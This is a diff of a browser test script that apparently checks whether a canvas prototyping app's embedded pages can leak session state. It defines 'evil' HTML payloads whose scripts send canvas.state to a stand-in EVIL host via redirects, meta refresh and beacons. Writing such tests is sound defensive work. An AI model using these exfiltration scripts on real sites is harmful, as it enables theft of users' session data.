@@ -75,7 +75,7 @@ if (!appUrl) {
 
 const state = `JSON.stringify(canvas.state)`;
 const loop = (k, stop = false) => `<h1>Innocent</h1><script>setInterval(() => { location.href = ${JSON.stringify(EVIL)} + '/${k}?s=' + encodeURIComponent(${state});${stop ? ' setTimeout(() => window.stop(), 30);' : ''} }, 100);</script>`;
-const hashPage = () => `<h1>Innocent</h1><div style="height:3000px"></div><h2 id="sec">sec</h2><script>addEventListener('hashchange', () => { document.body.dataset.hc = (+document.body.dataset.hc || 0) + 1; }); setTimeout(() => { for (const h of ['#sec', ' #', '#']) { const a = document.createElement('a'); a.href = h; document.body.append(a); a.click(); } }, 300);</script>`;
+const hashPage = (prevented = false) => `<h1>Innocent</h1><div style="height:3000px"></div><h2 id="sec">sec</h2><script>addEventListener('hashchange', () => { document.body.dataset.hc = (+document.body.dataset.hc || 0) + 1; }); setTimeout(() => { for (const h of ['#sec', ' #', '#']) { const a = document.createElement('a'); a.href = h; ${prevented ? 'a.onclick = (e) => e.preventDefault();' : ''} document.body.append(a); a.click(); } }, 300);</script>`;
 const evil = {
   location: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/location?s=' + encodeURIComponent(${state});</script>`,
   meta: `<h1>Innocent</h1><script>const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${EVIL}/meta?s=' + encodeURIComponent(${state}); document.head.append(m);</script>`,
@@ -84,6 +84,8 @@ const evil = {
   play: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/play?s=' + encodeURIComponent(${state});</script>`,
   // in-page links must keep working: scroll, 0 requests, frame stays
   hash: hashPage(),
+  // a page's own preventDefault on an in-page link wins: nothing changes
+  hashprevented: hashPage(true),
   playhash: hashPage(),
   // navigations that never load a document (so no `load` fires on the frame), repeated, and one that lands on a page that beacons
   n204: loop('n204'),
@@ -103,7 +105,8 @@ const evil = {
 const browser = await chromium.launch({ channel: 'chrome', headless: true });
 let code = 0;
 // a stuck browser call must end the run with a message, not hang it
-const watchdog = setTimeout(() => { console.error(`FAIL (${mode}): no result after 4 minutes (stuck browser call?)`); process.exit(1); }, 240_000);
+let step = 'start';
+const watchdog = setTimeout(() => { console.error(`FAIL (${mode}): stuck for the whole run (150 s) at step "${step}"; hits so far: ${hits.length}`); process.exit(1); }, 150_000);
 watchdog.unref?.();
 try {
   const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
@@ -111,6 +114,7 @@ try {
   const errors = [];
   page.on('pageerror', (e) => errors.push(String(e)));
   await page.goto(appUrl);
+  step = 'start page';
   await page.waitForFunction(() => window.app?.dispatch, null, { timeout: 30_000 });
   await page.evaluate(() => {
     app.store.load({ nodes: [], edges: [] });
@@ -120,6 +124,7 @@ try {
   const signup = seeded.find((x) => x[1] === 'Sign up')?.[0];
   if (!signup) throw new Error('seed has no Sign up page');
 
+  step = 'type the name into Sign up';
   // put "Ada" into the session state the way a person would: interact with the Sign up page and type
   await page.evaluate(() => app.view.fit());
   const box = page.locator(`[data-node-id="${signup}"]`);
@@ -133,9 +138,10 @@ try {
   const idleScripts = mode === 'strict' ? true : idleSandbox !== '';
   console.log(`mode ${mode}; idle thumbnails: sandbox="${idleSandbox}" (${mode === 'strict' ? 'scripts on, navigation guard' : idleScripts ? 'scripts ON, no state' : 'scripts OFF'})`);
 
+  step = 'create the idle evil pages and wait';
   // the evil pages, as idle thumbnails
   const navKeys = ['location', 'meta', 'navigation', 'link', 'fakeload', 'n204', 'download', 'stop', 'beacon'];
-  const benignKeys = ['hash'];
+  const benignKeys = ['hash', 'hashprevented'];
   const idleKeys = [...navKeys, ...benignKeys, 'typed'];
   await page.evaluate(({ evil, idleKeys }) => {
     let i = 0;
@@ -144,6 +150,7 @@ try {
   await page.waitForTimeout(3000);
   const idle = [...hits];
 
+  step = 'type into the interactive page';
   // typing into an interactive evil page
   const idOf = (k) => page.evaluate((k) => app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id, k);
   const typedId = await idOf('typed');
@@ -153,6 +160,7 @@ try {
   await t.frameLocator('iframe').locator('#i').pressSequentially('hunter2', { delay: 60 }).catch(() => {}); // the frame may be removed under us
   await page.waitForTimeout(1500);
 
+  step = 'measure the idle pages';
   // control: the pages really rendered and stayed put (blocked is not "never loaded"), or were removed
   const leaked = (name) => hits.filter((h) => { const p = h.split('?')[0]; return p === '/' + name || p === '/' + name + 'x'; }); // `x`: a beacon page's follow-up requests
   const stateOf = (h) => decodeURIComponent(h.split('?s=')[1] ?? '');
@@ -167,12 +175,13 @@ try {
     const id = await idOf(k);
     const text = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('h1').textContent({ timeout: 1500 }).catch(() => null);
     const hc = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('body').getAttribute('data-hc', { timeout: 1500 }).catch(() => null);
-    benign[k] = { intact: text === 'Innocent', requests: leaked(k).length, hashchange: Number(hc) >= 1 };
+    benign[k] = { intact: text === 'Innocent', requests: leaked(k).length, hashchange: k === 'hashprevented' ? !(Number(hc) >= 1) : Number(hc) >= 1 }; // prevented: no hashchange is the right result
   }
   const typedValue = await t.frameLocator('iframe').locator('#i').inputValue({ timeout: 1500 }).catch(() => null);
   const typedGone = (await t.locator('.pg-gone').count()) > 0;
   const beforePlay = hits.length;
 
+  step = 'Play vectors';
   // Play: name typed in Play, then a page that reads canvas.state and leaves. Each Play page also sits
   // on the canvas as an idle thumbnail; that request has no state, the Play one carries the name.
   const playKeys = ['play', 'fakeplay', 'play204', 'playdownload', 'playstop', 'playbeacon'];
@@ -183,22 +192,29 @@ try {
   // (and the idle evil pages are removed first): a pile of them once stalled the strict-mode run.
   await page.evaluate((titles) => app.dispatch('core.delete', { ids: app.doc.nodes.filter((n) => titles.includes(n['x-page']?.title)).map((n) => n.id) }), idleKeys.map((k) => 'Evil ' + k));
   for (const k of [...playKeys, ...playBenign]) {
+    step = `Play vector ${k}: add the page`;
     await page.evaluate(({ html, signupId, k }) => {
       app.dispatch('page.create', { x: 1800, y: 600, title: 'Evil ' + k, html });
       const id = app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id;
       app.dispatch('page.link', { from: signupId, to: id, label: 'Go ' + k });
     }, { html: evil[k], signupId: signup, k });
+    step = `Play vector ${k}`;
     await page.evaluate((id) => app.prototype.player.start(id), signup);
+    step = `Play vector ${k}: fill the name`;
     await dev.frameLocator('iframe').locator('[data-store="name"]').fill('Ada Secret');
+    step = `Play vector ${k}: click the link chip`;
     await page.waitForTimeout(300);
     await page.locator('.pg-chip', { hasText: new RegExp(`→\\s+Evil ${k}$`) }).click();
+    step = `Play vector ${k}: measure`;
     await page.waitForTimeout(2500);
     const r = { hashchange: Number(await dev.frameLocator('iframe').locator('body').getAttribute('data-hc', { timeout: 1000 }).catch(() => null)) >= 1, gone: (await dev.locator('.pg-gone').count()) > 0, still: await dev.frameLocator('iframe').locator('h1').textContent({ timeout: 1000 }).catch(() => null) };
+    step = `Play vector ${k}: Esc`;
     await page.keyboard.press('Escape');
     await page.waitForTimeout(300);
     r.closed = !(await page.evaluate(() => app.prototype.player.isOpen));
     r.hits = leaked(k).filter((h) => stateOf(h) !== '{}');
     playRes[k] = r;
+    step = `Play vector ${k}: remove the page`;
     await page.evaluate((k) => app.dispatch('core.delete', { ids: app.doc.nodes.filter((n) => n['x-page']?.title === 'Evil ' + k).map((n) => n.id) }), k);
   }
 
@@ -216,8 +232,8 @@ try {
   const checks = [];
   const check = (name, v) => checks.push([name, !!v]);
   const allNav = (f) => navKeys.every((k) => f(nav[k], k));
-  const playsOk = (strict) => playKeys.every((k) => (strict ? playRes[k].still === 'Innocent' : playRes[k].hits.length === 1 && playRes[k].gone && playRes[k].hits[0].includes('Ada')) && playRes[k].closed);
-  check('in-page links (#sec, #) keep the frame and send nothing', benignOk);
+  const playsOk = (strict) => playKeys.every((k) => (strict ? playRes[k].still === 'Innocent' : playRes[k].hits.length >= 1 && playRes[k].gone && playRes[k].hits.every((h) => h.includes('Ada'))) && playRes[k].closed);
+  check('in-page links (#sec, " #", #) keep the frame and send nothing; a page\'s preventDefault wins', benignOk);
   if (expect === 'leak') {
     check('old app leaks from idle thumbnails', hits.length > 0 && idle.length > 0);
   } else if (mode === 'strict') {
@@ -229,13 +245,13 @@ try {
     check('idle: 0 requests', idle.length === 0);
     check('idle pages render (no scripts)', allNav((n) => n.intact));
     check('typed: <= 1 request, frame removed', leaked('typed').length <= 1 && typedGone);
-    check('Play: exactly the accepted request (the Play state), frame removed, Esc closes Play', playsOk(false));
+    check('Play: >= 1 request (the accepted leak, with the Play state; not capped), frame removed, Esc closes Play', playsOk(false));
   } else {
     check('idle: <= 1 request per page', allNav((n) => n.requests <= 1));
     check('idle: a request means the frame was removed', allNav((n) => n.requests === 0 || n.gone));
     check('idle: no request carries state', idle.every((h) => !h.includes('Ada') && (h.startsWith('/typed') || stateOf(h) === '{}')));
     check('typed: <= 1 request, frame removed', leaked('typed').length <= 1 && typedGone);
-    check('Play: exactly the accepted request (the Play state), frame removed, Esc closes Play', playsOk(false));
+    check('Play: >= 1 request (the accepted leak, with the Play state; not capped), frame removed, Esc closes Play', playsOk(false));
   }
   for (const [n, v] of checks) console.log(`${v ? 'ok  ' : 'FAIL'} ${n}`);
   const ok = checks.every(([, v]) => v);
